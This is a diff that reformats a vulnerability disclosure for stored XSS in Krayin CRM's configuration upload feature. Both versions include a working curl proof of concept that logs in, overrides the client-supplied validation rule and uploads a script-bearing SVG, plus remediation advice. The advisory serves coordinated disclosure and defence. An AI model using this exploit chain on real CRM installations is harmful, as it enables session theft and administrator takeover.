@@ -1,140 +1,228 @@
-\# Stored XSS via Client-Controlled Upload Validation in Configuration (Krayin CRM ≤ 2.2.5)
+# Stored Cross-Site Scripting (XSS) via Client-Controlled Upload Validation in Configuration (Krayin CRM ≤ 2.2.5)
 
+## Presentation
 
+- **Security Vulnerability:** Stored Cross-Site Scripting (Stored XSS)
+- **Vulnerability Type:** Cross-Site Scripting
+- **CWE:** CWE-79 (Primary), CWE-602 (Root Cause), CWE-434 (Contributing)
+- **CVE:** Pending
+- **Affected Component:** Configuration Upload (`ConfigurationController::store()` / `ConfigurationForm`)
+- **Software:** Krayin CRM
+- **Affected Versions:** ≤ 2.2.5
+- **Business Area:** Customer Relationship Management (CRM)
+- **Submitter:** bl4dsc4n
 
-\## CVE description
+---
 
-Cross-site scripting in the configuration upload feature (`ConfigurationController::store()` / `ConfigurationForm`) in Krayin CRM through 2.2.5 allows an authenticated user with configuration-edit permission to store executable SVG/HTML content served from the public storage disk. The upload validation rules are derived from the client-supplied `keys\[]` parameter (so the attacker can weaken the `mimes` rule to `nullable` or omit it), and SVG is included in the default allow-list; the stored file at `/storage/configuration/<name>.svg` is served as `image/svg+xml` and executes JavaScript in the application origin.
+## CVE Description
 
+A stored cross-site scripting (XSS) vulnerability in the configuration upload functionality of Krayin CRM through version 2.2.5 allows an authenticated user with configuration-edit permissions to upload and store malicious SVG or arbitrary files by manipulating client-controlled validation rules. Because uploaded files are stored on the public disk and served from the application origin, an attacker can execute arbitrary JavaScript when the uploaded file is accessed.
 
+---
 
-\## Summary
+## Summary
 
-Krayin builds the validation rules for configuration uploads (e.g. the admin Logo / Favicon) from a hidden `keys\[]` field submitted by the browser, rather than from a trusted server-side definition. An attacker who can edit configuration can change the validation to `nullable` (or drop `keys\[]`) and upload arbitrary file types. Even without that bypass, SVG is in the default allow-list, and uploads are written to the public disk (`storage/app/public/configuration`, exposed via `/storage`). An uploaded SVG containing a `<script>` is served as `image/svg+xml` and runs in the CRM origin when the file URL is opened.
+Krayin derives upload validation rules for configuration files (such as the administrative logo and favicon) from the client-supplied `keys[]` parameter instead of a trusted server-side definition.
 
+An authenticated user with configuration-edit privileges can modify the validation rules to `nullable` (or omit them entirely), bypassing file-type restrictions and uploading arbitrary content. Additionally, the default allow-list already permits SVG files (`mimes:bmp,jpeg,jpg,png,webp,svg`).
 
+Uploaded files are written to the public storage disk (`storage/app/public/configuration`) and exposed through the `/storage` path. Since SVG files are served with the `image/svg+xml` content type, embedded JavaScript executes in the application's origin whenever the uploaded file is opened.
 
-\## Severity
+---
 
-High — CVSS 3.1 `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (8.7). Stored XSS; the malicious file is additionally reachable without authentication at its `/storage` URL.
+## Severity
 
+**High**
 
+**CVSS v3.1:** `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (**8.7**)
 
-\## Affected Versions
+This issue results in Stored Cross-Site Scripting. The malicious payload is additionally accessible without authentication through its public `/storage` URL.
 
-Confirmed on 2.2.4 and 2.2.5 (latest). `ConfigurationForm` (the client-driven rule builder) is identical across both releases. The 2.2.5 security fix (#2614) moved email attachments to a private disk but did not touch configuration uploads, which still land on the public disk.
+---
 
+## Affected Versions
 
+- Confirmed on **2.2.4**
+- Confirmed on **2.2.5** (latest)
 
-\## Affected Component
+The vulnerable `ConfigurationForm` implementation is identical in both releases.
 
-\- Request: `Webkul\\Admin\\Http\\Requests\\ConfigurationForm` — `rules()`
+Although version 2.2.5 introduced a security fix that moved email attachments to a private storage disk, configuration uploads remain publicly accessible and continue to use client-controlled validation.
 
-\- Controller: `Webkul\\Admin\\Http\\Controllers\\Configuration\\ConfigurationController` — `store()`
+---
 
-\- Endpoint: `POST /admin/configuration/{slug}/{slug2}` (e.g. `/admin/configuration/general/general`)
+## Affected Component
 
+**Request**
 
+- `Webkul\Admin\Http\Requests\ConfigurationForm`
+- Method: `rules()`
 
-\## Description
+**Controller**
 
-`ConfigurationForm::rules()` decodes the client-supplied `keys\[]` JSON and uses the `validation` value found there:
+- `Webkul\Admin\Http\Controllers\Configuration\ConfigurationController`
+- Method: `store()`
 
-
-
-```php
-
-return collect(request()->input('keys', \[]))->mapWithKeys(function ($item) {
-
-&#x20;   $data = json\_decode($item, true);
-
-&#x20;   return collect($data\['fields'])->mapWithKeys(function ($field) use ($data) {
-
-&#x20;       $key = $data\['key'].'.'.$field\['name'];
-
-&#x20;       $validation = $field\['validation'] ?? 'nullable';   // rule comes from the client
-
-&#x20;       return \[$key => $validation];
-
-&#x20;   })->toArray();
-
-})->toArray();
+**Endpoint**
 
 ```
+POST /admin/configuration/{group}/{section}
+```
 
+Example:
 
+```
+POST /admin/configuration/general/general
+```
 
-Because the rule is client-controlled, an attacker sets it to `nullable` and uploads any file. Independently, the default logo/favicon rule already allows `svg` (`mimes:bmp,jpeg,jpg,png,webp,svg`), and `ConfigurationController::store()` calls `configurationRepository->create(request()->all())`, writing the file to the public disk under `configuration/`.
+---
 
+## Technical Details
 
+`ConfigurationForm::rules()` constructs upload validation rules directly from the client-controlled `keys[]` parameter:
 
-\## Proof of Concept
+```php
+return collect(request()->input('keys', []))->mapWithKeys(function ($item) {
+    $data = json_decode($item, true);
 
-As a user with configuration-edit permission:
+    return collect($data['fields'])->mapWithKeys(function ($field) use ($data) {
+        $key = $data['key'].'.'.$field['name'];
 
+        $validation = $field['validation'] ?? 'nullable';
 
+        return [$key => $validation];
+    })->toArray();
+})->toArray();
+```
+
+Because validation is entirely controlled by the request:
+
+- the attacker can replace the upload rule with `nullable`;
+- file-type restrictions can be bypassed;
+- arbitrary file types may be uploaded.
+
+Separately, the default validation already allows SVG uploads:
+
+```
+mimes:bmp,jpeg,jpg,png,webp,svg
+```
+
+`ConfigurationController::store()` subsequently processes the request using:
+
+```php
+configurationRepository->create(request()->all());
+```
+
+The uploaded file is stored in:
+
+```
+storage/app/public/configuration/
+```
+
+and becomes publicly accessible through:
+
+```
+/storage/configuration/<filename>
+```
+
+---
+
+## Proof of Concept
+
+Authenticate as a user with configuration-edit permission.
 
 ```bash
+BASE=https://TARGET
+CJ=$(mktemp)
 
-BASE=https://TARGET; CJ=$(mktemp)
+LT=$(curl -s -c "$CJ" "$BASE/admin/login" \
+ | grep -oE 'name="_token" value="[^"]+"' \
+ | sed -E 's/.*value="([^"]+)".*/\1/')
 
-LT=$(curl -s -c "$CJ" "$BASE/admin/login" | grep -oE 'name="\_token" value="\[^"]+"' | sed -E 's/.\*value="(\[^"]+)".\*/\\1/')
+curl -s -b "$CJ" -c "$CJ" \
+  -X POST "$BASE/admin/login" \
+  --data-urlencode "_token=$LT" \
+  --data-urlencode "email=admin@example.com" \
+  --data-urlencode "password=admin123"
 
-curl -s -b "$CJ" -c "$CJ" -o /dev/null -X POST "$BASE/admin/login" \\
-
-&#x20; --data-urlencode "\_token=$LT" --data-urlencode "email=admin@example.com" --data-urlencode "password=admin123"
-
-XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\\s+(\\S+)',open('$CJ').read()).group(1)))")
-
-
+XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\s+(\S+)',open('$CJ').read()).group(1)))")
 
 printf '%s' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.svg
 
-
-
-curl -s -b "$CJ" -X POST "$BASE/admin/configuration/general/general" -H "X-XSRF-TOKEN: $XSRF" \\
-
-&#x20; -F 'keys\[]={"key":"general.general.admin\_logo","fields":\[{"name":"logo\_image","validation":"nullable"},{"name":"favicon\_image","validation":"nullable"}]}' \\
-
-&#x20; -F "general\[general]\[admin\_logo]\[logo\_image]=@evil.svg;type=image/svg+xml"
-
+curl -s -b "$CJ" \
+  -X POST "$BASE/admin/configuration/general/general" \
+  -H "X-XSRF-TOKEN: $XSRF" \
+  -F 'keys[]={"key":"general.general.admin_logo","fields":[{"name":"logo_image","validation":"nullable"},{"name":"favicon_image","validation":"nullable"}]}' \
+  -F "general[general][admin_logo][logo_image]=@evil.svg;type=image/svg+xml"
 ```
 
+### Observed Result
 
+The uploaded SVG is stored successfully and becomes publicly accessible:
 
-Observed result: the file is stored and served at `GET /storage/configuration/<random>.svg` with HTTP 200, `Content-Type: image/svg+xml`, and the `<script>` intact. Opening the URL executes JavaScript in the application origin. The `/storage` URL requires no authentication. Setting `validation` to `nullable` also allows non-image types (e.g. an `.html` file served as `text/html`).
+```
+GET /storage/configuration/<random>.svg
+```
 
+Response:
 
+- HTTP 200
+- Content-Type: `image/svg+xml`
+- Embedded `<script>` preserved
 
-\## Impact
+Opening the URL executes JavaScript in the application's origin.
 
-Stored XSS executing in the CRM origin (session/CSRF-token theft, actions as the victim, admin-panel takeover when a privileged user opens the file). The payload URL under `/storage` is publicly reachable regardless of authentication. The client-controlled validation additionally permits unrestricted file types.
+Because `/storage` is publicly exposed, the payload can be accessed without authentication.
 
+When validation is changed to `nullable`, arbitrary files (such as `.html`) may also be uploaded and served.
 
+---
 
-\## Suggested Remediation
+## Impact
 
-\- Derive upload validation from a trusted server-side configuration definition; never build rules from client input (`keys\[]`).
+Successful exploitation allows an authenticated attacker with configuration-edit permissions to perform Stored Cross-Site Scripting within the CRM application.
 
-\- Remove `svg` from the upload allow-list, or sanitize SVG content server-side before storage; validate by inspected MIME/magic bytes, not just extension.
+An attacker can:
 
-\- Store configuration uploads on a private disk and serve them through a controller with a safe `Content-Type`/`Content-Disposition` and a restrictive CSP.
+- execute arbitrary JavaScript in the application's origin;
+- steal authenticated sessions;
+- steal CSRF tokens;
+- perform actions on behalf of victims;
+- compromise privileged administrator sessions;
+- upload arbitrary file types by bypassing client-controlled validation;
+- host malicious payloads that remain publicly accessible under `/storage`.
 
+---
 
+## Suggested Remediation
 
-\## Weakness classification
+- Generate upload validation rules exclusively from trusted server-side configuration.
+- Never derive validation rules from client-controlled parameters such as `keys[]`.
+- Remove SVG from the allowed upload types or sanitize SVG content before storage.
+- Validate uploaded files using MIME detection and file signatures instead of extensions alone.
+- Store configuration uploads on a private storage disk.
+- Serve uploaded files through a controller that enforces safe `Content-Type`, `Content-Disposition`, and an appropriate Content Security Policy (CSP).
 
-\- Primary: CWE-79 (Cross-site Scripting)
+---
 
-\- Root cause: CWE-602 (Client-Side Enforcement of Server-Side Security)
+## Weakness Classification
 
-\- Contributing: CWE-434 (Unrestricted Upload of File with Dangerous Type)
+| Classification | Identifier |
+|---------------|------------|
+| Primary | CWE-79 – Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') |
+| Root Cause | CWE-602 – Client-Side Enforcement of Server-Side Security |
+| Contributing | CWE-434 – Unrestricted Upload of File with Dangerous Type |
 
-\- VulDB class: Cross Site Scripting
+**VulDB Classification**
 
+- Cross Site Scripting
 
+---
 
-\## Disclosure
+## Disclosure
 
-Reported privately under coordinated disclosure. PoC and version evidence available on request. Please credit the reporter and request a CVE ID.
+This issue was reported privately under a coordinated vulnerability disclosure process.
 
+Proof-of-concept, reproduction steps, and version verification are available upon request.
+
+Please credit the reporter and request a CVE identifier if applicable.
